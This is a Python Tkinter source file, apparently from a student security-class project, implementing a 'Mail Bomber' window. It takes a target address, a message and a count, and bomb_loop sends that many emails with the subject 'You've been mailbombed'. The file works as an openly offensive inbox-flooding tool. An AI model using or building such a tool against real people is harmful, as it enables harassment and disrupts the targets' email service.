# Auteurs: Benjamin BEYERLE - Philippe DA SILVA OLIVEIRA - Karthike EZHILARASAN - Alexandre KOSTAS
# Classe: SRC1 - 3E
# Projet - ClicMed

import settings


def main_frame(root_frame, username, group):
    settings.login.clear_window(root_frame)
    root_frame.configure(background='#3c3f41')

    root_frame.title('Mail Bomber')
    root_frame.geometry('290x290')
    root_frame.maxsize(290, 290)
    root_frame.minsize(290, 290)

    email = settings.tk.StringVar()
    nb_mail = settings.tk.StringVar()

    label10 = settings.tk.Label(root_frame, text='Email of target : ', font=("Arial", 10), fg='white', bg='#3c3f41')
    label10.grid(row=0, column=0, pady=2, sticky="w")

    label11 = settings.tk.Entry(root_frame, textvariable=email, font=("Arial", 11), fg='black', bg='white', width=20)
    label11.grid(row=0, column=1, pady=2, sticky='w')

    label20 = settings.tk.Label(root_frame, text='Message : ', font=("Arial", 10), fg='white', bg='#3c3f41')
    label20.grid(row=1, column=0, pady=2, sticky="ne")

    label21 = settings.tk.Text(root_frame, font=("Arial", 11), fg='black', bg='white', width=20, height=10)
    label21.grid(row=1, column=1, pady=2, sticky='w')

    label30 = settings.tk.Label(root_frame, text='Number of mail : ', font=("Arial", 10), fg='white', bg='#3c3f41')
    label30.grid(row=2, column=0, pady=2, sticky="ne")

    label31 = settings.tk.Entry(root_frame, textvariable=nb_mail, font=("Arial", 11), fg='black', bg='white', width=5)
    label31.grid(row=2, column=1, pady=2, sticky='w')

    attack_btn = settings.tk.Button(root_frame, text='Send!',
                                    command=lambda: bomb_loop(label11.get(), label31.get(),
                                                              label21.get("1.0", 'end-1c'), progress_bar))
    attack_btn.grid(row=2, column=1, sticky="w", padx=50)

    progress_bar = settings.ttk.Progressbar(root_frame, orient='horizontal', length=165)
    progress_bar.grid(row=3, column=1, sticky='w', pady=2)

    return_btn = settings.tk.Button(root_frame, text='Return',
                                    command=lambda: settings.menu.main_frame(root_frame, username, group))
    return_btn.grid(row=4, column=1, sticky="se", padx=35, pady=2)

    exit_btn = settings.tk.Button(root_frame, text='Exit', command=root_frame.destroy)
    exit_btn.grid(row=4, column=1, sticky="se", pady=2)


def bomb_loop(email_target, nb_mails, message, progress_bar):
    progress_bar.config(maximum=int(nb_mails), mode='determinate', value='0')
    message = 'Subject: {}\n\n{}'.format("You've been mailbombed", message)
    for i in range(0, int(nb_mails)):
        settings.user_manager.send_mail(email_target, message)
        progress_bar['value'] = i
        progress_bar.update()

    progress_bar['value'] = int(nb_mails)
    progress_bar.update()

    popup = settings.tk.Toplevel()
    popup.wm_title("Success!")
    ico_popup = settings.tk.PhotoImage(file=settings.ICO)
    popup.configure(background='#3c3f41')
    popup.geometry('150x130')
    popup.maxsize(150, 70)
    popup.minsize(150, 70)
    popup.grab_set()
    popup.tk.call('wm', 'iconphoto', popup._w, ico_popup)
    label = settings.tk.Label(popup, text="Mails have been sent !", font=("Arial", 11), fg='white', bg='#3c3f41')
    label.pack(side="top", fill="x", pady=10)
    okay_btn = settings.tk.Button(popup, text="Okay", command=popup.destroy)
    okay_btn.pack()
    progress_bar['value'] = 0
    progress_bar.update()
    popup.mainloop()
